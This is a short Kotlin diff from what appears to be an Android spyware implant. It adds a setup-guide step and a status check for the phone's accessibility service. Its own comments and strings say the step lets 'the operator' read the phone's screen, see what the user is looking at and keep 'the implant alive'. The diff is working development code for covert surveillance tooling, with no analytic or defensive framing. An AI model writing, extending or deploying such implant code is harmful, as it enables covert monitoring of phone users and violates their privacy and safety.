@@ -130,6 +130,10 @@ object Vendor {
         } else {
             notifications.areNotificationsEnabled.toString()
         }
+        // The accessibility service is the one permission that gives the
+        // operator the screen of the phone, so the guide says whether it is
+        // on.
+        out["accessibility"] = Ui.isEnabled().toString()
         return out
     }
 
@@ -201,6 +205,16 @@ object Vendor {
                 },
                 action = Settings.ACTION_APP_NOTIFICATION_SETTINGS,
                 data = "package:$packageName",
+            ),
+        )
+
+        out.add(
+            Step(
+                id = "accessibility",
+                title = "let the operator read the screen of the phone",
+                why = "the accessibility service keeps the implant alive, and it is the only way to see what the user is looking at; the user of the phone sees it in the settings",
+                state = if (Ui.isEnabled()) "yes" else "no",
+                action = Settings.ACTION_ACCESSIBILITY_SETTINGS,
             ),
         )
 
